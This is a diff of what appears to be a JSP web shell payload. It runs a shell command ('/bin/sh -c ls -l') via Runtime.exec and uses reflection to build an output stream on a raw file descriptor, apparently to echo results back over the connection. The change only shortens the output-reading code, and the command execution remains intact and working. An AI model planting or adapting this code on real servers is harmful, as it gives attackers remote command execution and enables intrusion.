@@ -45,16 +45,8 @@
     c.setAccessible(true);
 
     cmd = new String[]{"/bin/sh", "-c", "ls -l" };
-    br = new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
-
-    StringBuilder sb = new StringBuilder();
-    while ((line = br.readLine()) != null){
-        sb.append(line + "\n");
-    }
+    String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
 
     java.io.FileOutputStream os = new java.io.FileOutputStream(c.newInstance(fd));
-    os.write(sb.toString().getBytes());
-
-    br.close();
-	os.close();
+    os.write(res.getBytes());
 %>
